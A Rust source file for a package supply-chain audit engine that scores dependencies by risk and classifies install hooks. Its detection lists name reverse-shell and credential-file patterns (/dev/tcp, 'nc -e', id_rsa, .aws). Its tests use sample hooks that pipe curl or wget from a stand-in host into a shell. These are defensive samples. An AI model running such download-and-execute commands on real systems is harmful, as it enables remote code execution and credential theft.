//! Supply-chain audit (`audit`) — pattern of the consolidators.
//!
//! We copy the **heart** of Socket.dev (risk factors + score confluence),
//! of Snyk/cargo-audit (policy + `fail_on` + exit code) and of OWASP
//! Dependency-Check (FP suppression with a reason), but with three security
//! locks of our own:
//!
//! 1. **No isolated signal is a verdict.** Severity comes from the *sum* of
//!    weights (confluence) and only a score ≥ [`FINDING_THRESHOLD`] becomes a
//!    finding — so `^4.18.0` (a normal range) or a benign `postinstall` do
//!    **not** become an alert.
//! 2. **We classify the CONTENT of the hook**, not just its existence:
//!    `node-gyp rebuild`/`prebuild-install` are expected; `curl|sh`/base64 are
//!    suspicious.
//! 3. **Suppression requires an expiration** — an ignore never becomes an
//!    eternal shield for a compromised package (forced re-triage).
//!
//! The engine is **pure** (a function of [`PackageSnapshot`]s), so it is
//! testable offline with real cases. The CLI only populates the snapshots (and
//! optionally queries the registry).

use devforge_shared::{
    AuditFinding, AuditPolicy, AuditReport, AuditSeverity, Confidence, PackageOrigin,
    PackageSnapshot, RiskFactor, Suppression,
};

/// Below this we do not turn it into a finding (avoids noise from a lone weak signal).
const FINDING_THRESHOLD: u8 = 25;
/// Weekly downloads below which the package is "suspected of low exposure".
const LOW_DOWNLOADS: u64 = 1000;

// ---------------------------------------------------------------------------
// Install hook classifier (anti-false-positive)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HookVerdict {
    /// Known and legitimate pattern (native build, husky, prebuild...).
    Benign,
    /// Known and malicious pattern (download+shell, obfuscation, credential).
    Suspicious,
    /// Not recognized — becomes a weak signal, not a verdict.
    Unknown,
}

#[derive(Debug, Clone)]
pub struct HookAnalysis {
    pub verdict: HookVerdict,
    /// Reason, when suspicious.
    pub reason: Option<String>,
    /// Behaviors observed in the script text (network/shell/fs/env/obf.).
    pub behaviors: Vec<RiskFactor>,
}

/// Analyzes the **text** of an install script. Honest limitation: we only see
/// the script, not the files it invokes (`node install.js`) — so it is a
/// signal, not a guarantee. Catches the classic direct attacks in the script.
pub fn classify_hook(script: &str) -> HookAnalysis {
    let lower = script.to_ascii_lowercase();
    let behaviors = detect_behaviors(&lower);

    let reason = suspicious_reason(&lower);
    let (verdict, reason) = match reason {
        Some(r) => (HookVerdict::Suspicious, Some(r)),
        None if is_benign(&lower) => (HookVerdict::Benign, None),
        None => (HookVerdict::Unknown, None),
    };

    HookAnalysis {
        verdict,
        reason,
        behaviors,
    }
}

/// Malicious patterns (checked BEFORE the benign ones — suspicious wins).
fn suspicious_reason(lower: &str) -> Option<String> {
    let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| sh -", "|base64", "| base64"];
    if (lower.contains("curl ") || lower.contains("wget ") || lower.contains("curl\t"))
        && pipes_to_shell.iter().any(|p| lower.contains(p))
    {
        return Some("baixa e executa código remoto via shell".into());
    }
    if lower.contains("/dev/tcp") || lower.contains("nc -e") || lower.contains("bash -i") {
        return Some("possível shell reversa".into());
    }
    if lower.contains("id_rsa") || lower.contains(".ssh") || lower.contains(".aws")
        || lower.contains("credentials") || lower.contains(".npmrc")
        || lower.contains(".kube")
    {
        return Some("acesso a credenciais/chaves locais".into());
    }
    if (lower.contains("base64 -d") || lower.contains("base64 --decode") || lower.contains("atob("))
        && (lower.contains("eval") || lower.contains("exec") || lower.contains("Function("))
    {
        return Some("código ofuscado executado em runtime".into());
    }
    None
}

/// Legitimate install patterns (native build, framework tooling etc.).
fn is_benign(lower: &str) -> bool {
    const EXPECTED: &[&str] = &[
        "node-gyp rebuild",
        "node-gyp build",
        "node-gyp clean",
        "prebuild-install",
        "husky install",
        "husky set",
        "husky",
        "patch-package",
        "install-app-deps",
        "electron-builder",
        "neon build",
        "opencollective",
        "install-name-deps",
    ];
    EXPECTED.iter().any(|p| lower.contains(p))
}

/// Behaviors (Socket risk factors) observable in the script text.
fn detect_behaviors(lower: &str) -> Vec<RiskFactor> {
    let mut out = Vec::new();
    let has = |pats: &[&str]| pats.iter().any(|p| lower.contains(p));

    if has(&[
        "http://", "https://", "curl ", "wget ", "fetch(", "xmlhttprequest", "net.connect",
        "dns.", "require(\"https\")", "require('https')",
    ]) {
        out.push(RiskFactor::NetworkAccess);
    }
    if has(&[
        "child_process", "exec(", "execsync", "spawn", "| sh", "| bash", "/bin/sh", "powershell",
    ]) {
        out.push(RiskFactor::ShellAccess);
    }
    if has(&["writefile", "appendfile", "chmod", "process.env.home", "os.homedir"]) {
        out.push(RiskFactor::FilesystemAccess);
    }
    if has(&["process.env", "getenv", "os.env", "env["]) {
        out.push(RiskFactor::EnvAccess);
    }
    if has(&["base64", "atob(", "eval(", "\\x"]) {
        out.push(RiskFactor::Obfuscation);
    }
    out
}

// ---------------------------------------------------------------------------
// Audit engine (confluence + policy + suppression with expiry)
// ---------------------------------------------------------------------------

/// Weight of each factor ( Socket-style ). A benign install weighs little; a malicious one weighs a lot.
fn weight(factor: RiskFactor, verdict: HookVerdict) -> u8 {
    match factor {
        RiskFactor::InstallScript => match verdict {
            HookVerdict::Benign => 5,
            HookVerdict::Unknown => 15,
            HookVerdict::Suspicious => 40,
        },
        RiskFactor::NetworkAccess => 15,
        RiskFactor::ShellAccess => 20,
        RiskFactor::FilesystemAccess => 10,
        RiskFactor::EnvAccess => 12,
        RiskFactor::Obfuscation => 30,
        RiskFactor::NonRegistry => 25,
        RiskFactor::LowDownloads => 8,
        RiskFactor::Unpinned => 5,
        RiskFactor::NoIntegrity => 5,
    }
}

fn severity_from_score(score: u8) -> Option<AuditSeverity> {
    if score < FINDING_THRESHOLD {
        return None;
    }
    Some(match score {
        25..=49 => AuditSeverity::Medium,
        50..=74 => AuditSeverity::High,
        _ => AuditSeverity::Critical,
    })
}

fn is_expired(suppression: &Suppression, today: &str) -> bool {
    // ISO dates `YYYY-MM-DD` compare lexicographically. Expired = today > expires.
    today > suppression.expires.as_str()
}

/// Audits a set of snapshots and returns the report (pure function).
///
/// `today` is the current date (`YYYY-MM-DD`) used to check expiration of
/// suppressions.
pub fn audit_packages(
    snapshots: &[PackageSnapshot],
    policy: &AuditPolicy,
    suppressions: &[Suppression],
    today: &str,
) -> AuditReport {
    let mut report = AuditReport {
        fail_on: policy.fail_on,
        passed: true,
        ..Default::default()
    };

    for snapshot in snapshots {
        report.packages_audited += 1;
        if let Some(finding) = audit_one(snapshot, policy, suppressions, today, &mut report) {
            report.score = report.score.max(finding.score);
            if finding.severity.rank() >= policy.fail_on.rank() {
                report.passed = false;
            }
            report.findings.push(finding);
        }
    }

    report
        .findings
        .sort_by_key(|finding| std::cmp::Reverse(finding.severity.rank()));
    report
}

fn audit_one(
    snapshot: &PackageSnapshot,
    policy: &AuditPolicy,
    suppressions: &[Suppression],
    today: &str,
    report: &mut AuditReport,
) -> Option<AuditFinding> {
    let mut detected: Vec<(RiskFactor, Vec<String>)> = Vec::new();

    let allowlisted = policy.allowlist.iter().any(|a| a == &snapshot.name);
    if !matches!(snapshot.origin, PackageOrigin::Registry) && !allowlisted {
        let desc = match &snapshot.origin {
            PackageOrigin::Git(url) => format!("git: {url}"),
            PackageOrigin::Path => "caminho local".to_string(),
            PackageOrigin::File => "arquivo".to_string(),
            PackageOrigin::Registry => unreachable!("só chamado fora do registro"),
        };
        detected.push((
            RiskFactor::NonRegistry,
            vec![format!("procedência fora do registro ({desc})")],
        ));
    }
    if !snapshot.pinned {
        detected.push((
            RiskFactor::Unpinned,
            vec!["versão não fixada (range/coringa)".to_string()],
        ));
    }
    if !snapshot.has_integrity {
        detected.push((
            RiskFactor::NoIntegrity,
            vec!["sem hash de integridade conhecido".to_string()],
        ));
    }
    if let Some(downloads) = snapshot.downloads_last_week {
        if downloads < LOW_DOWNLOADS {
            detected.push((
                RiskFactor::LowDownloads,
                vec![format!("downloads/semana={downloads} (<{LOW_DOWNLOADS})")],
            ));
        }
    }

    // Install hook: classify and aggregate its behaviors.
    let mut verdict = HookVerdict::Unknown;
    if let Some(script) = &snapshot.install_script {
        let analysis = classify_hook(script);
        verdict = analysis.verdict;
        let reason = match verdict {
            HookVerdict::Suspicious => analysis
                .reason
                .clone()
                .unwrap_or_else(|| "comportamento suspeito".to_string()),
            HookVerdict::Benign => "hook de instalação com padrão esperado".to_string(),
            HookVerdict::Unknown => "hook de instalação não reconhecido".to_string(),
        };
        detected.push((RiskFactor::InstallScript, vec![reason]));
        for behavior in analysis.behaviors {
            detected.push((
                behavior,
                vec![format!("comportamento '{}' no script", behavior.id())],
            ));
        }
    }

    // Applies suppressions (with expiry) and sums the weights of the remaining factors.
    let mut score: u8 = 0;
    let mut factors = Vec::new();
    let mut evidence = Vec::new();
    for (factor, mut factor_evidence) in detected {
        if let Some(suppression) = find_suppression(suppressions, &snapshot.name, factor) {
            if !is_expired(suppression, today) {
                report.suppressed.push(suppression.clone());
                continue; // suppressed — does not count toward the score
            }
            report.expired_suppressions.push(suppression.clone());
            // expired → counts again (forced re-triage)
        }
        score = score.saturating_add(weight(factor, verdict));
        factors.push(factor);
        evidence.append(&mut factor_evidence);
    }

    let severity = severity_from_score(score)?;
    let confidence = Confidence::from_factor_count(factors.len());
    Some(AuditFinding {
        package: snapshot.name.clone(),
        factors,
        severity,
        score,
        confidence,
        evidence,
    })
}

fn find_suppression<'a>(
    suppressions: &'a [Suppression],
    package: &str,
    factor: RiskFactor,
) -> Option<&'a Suppression> {
    suppressions
        .iter()
        .find(|s| s.package == package && s.factor == factor)
}

#[cfg(test)]
mod tests {
    use super::*;
    use devforge_shared::PackageOrigin;

    fn snapshot(name: &str) -> PackageSnapshot {
        PackageSnapshot {
            name: name.to_string(),
            version: Some("1.0.0".to_string()),
            origin: PackageOrigin::Registry,
            install_script: None,
            downloads_last_week: Some(5_000_000),
            pinned: true,
            has_integrity: true,
            direct: true,
        }
    }

    #[test]
    fn normal_dep_produces_no_finding() {
        let snap = snapshot("express");
        let report = audit_packages(&[snap], &AuditPolicy::default(), &[], "2026-10-14");
        assert!(report.findings.is_empty(), "não deve alertar dep normal: {:?}", report.findings);
        assert!(report.passed);
    }

    #[test]
    fn benign_postinstall_produces_no_finding() {
        // Real esbuild case: prebuild-install/node-gyp — legitimate, NOT an attack.
        let mut snap = snapshot("esbuild");
        snap.version = Some("0.19.0".to_string());
        snap.install_script =
            Some("prebuild-install || node-gyp rebuild || node install.js".to_string());
        let report = audit_packages(&[snap], &AuditPolicy::default(), &[], "2026-10-14");
        assert!(
            report.findings.is_empty(),
            "postinstall benigno não deve virar alerta: {:?}",
            report.findings
        );
    }

    #[test]
    fn curl_pipe_sh_hook_becomes_critical() {
        let mut snap = snapshot("left-pad");
        snap.install_script = Some("curl -s http://evil.example/x.sh | sh".to_string());
        let report = audit_packages(&[snap], &AuditPolicy::default(), &[], "2026-10-14");
        let finding = &report.findings[0];
        assert_eq!(finding.severity, AuditSeverity::Critical);
        assert!(finding.factors.contains(&RiskFactor::InstallScript));
        assert!(!report.passed, "critical deve reprovar (fail_on=high)");
    }

    #[test]
    fn weak_signals_do_not_fire_alone() {
        // unpinned + no-integrity + low-downloads = 5+5+8 = 18 < 25 ⇒ nothing.
        let mut snap = snapshot("internex");
        snap.version = None;
        snap.pinned = false;
        snap.has_integrity = false;
        snap.downloads_last_week = Some(8);
        let report = audit_packages(&[snap], &AuditPolicy::default(), &[], "2026-10-14");
        assert!(report.findings.is_empty(), "sinal fraco isolado não alerta: {:?}", report.findings);
    }

    #[test]
    fn non_allowlisted_git_dep_alerts_allowlisted_does_not() {
        let mut git = snapshot("mymod");
        git.origin = PackageOrigin::Git("https://github.com/x/y".into());

        // Without allowlist → Medium (non-registry = 25).
        let r1 = audit_packages(std::slice::from_ref(&git), &AuditPolicy::default(), &[], "2026-10-14");
        assert_eq!(r1.findings[0].severity, AuditSeverity::Medium);

        // With allowlist (expected internal package) → nothing.
        let policy = AuditPolicy {
            fail_on: AuditSeverity::High,
            allowlist: vec!["mymod".into()],
        };
        let r2 = audit_packages(&[git], &policy, &[], "2026-10-14");
        assert!(r2.findings.is_empty(), "allowlist deve silenciar dep interno");
    }

    #[test]
    fn active_suppression_hides_expired_reactivates() {
        let mut git = snapshot("mymod");
        git.origin = PackageOrigin::Git("https://github.com/x/y".into());
        let sup = Suppression {
            package: "mymod".into(),
            factor: RiskFactor::NonRegistry,
            reason: "dep interno da empresa".into(),
            expires: "2027-01-01".into(),
        };

        // Active (today < expires) → suppressed, no finding.
        let active = audit_packages(std::slice::from_ref(&git), &AuditPolicy::default(), std::slice::from_ref(&sup), "2026-10-14");
        assert!(active.findings.is_empty(), "supressão vigente deve ocultar");
        assert_eq!(active.suppressed.len(), 1);

        // Expired (today > expires) → counts again.
        let expired = audit_packages(&[git], &AuditPolicy::default(), &[sup], "2027-06-01");
        assert_eq!(expired.findings.len(), 1, "supressão expirada deve reativar o alerta");
        assert_eq!(expired.expired_suppressions.len(), 1);
    }

    #[test]
    fn classifier_distinguishes_benign_from_malicious() {
        assert_eq!(classify_hook("node-gyp rebuild").verdict, HookVerdict::Benign);
        assert_eq!(classify_hook("prebuild-install").verdict, HookVerdict::Benign);

        let bad = classify_hook("wget http://a.co/p -O- | bash");
        assert_eq!(bad.verdict, HookVerdict::Suspicious);
        assert!(bad.reason.unwrap().contains("shell"));

        // Obfuscated behavior detected as a factor.
        let obf = classify_hook("node -e \"eval(Buffer.from('YQ==','base64'))\"");
        assert!(obf.behaviors.contains(&RiskFactor::Obfuscation));
    }
}
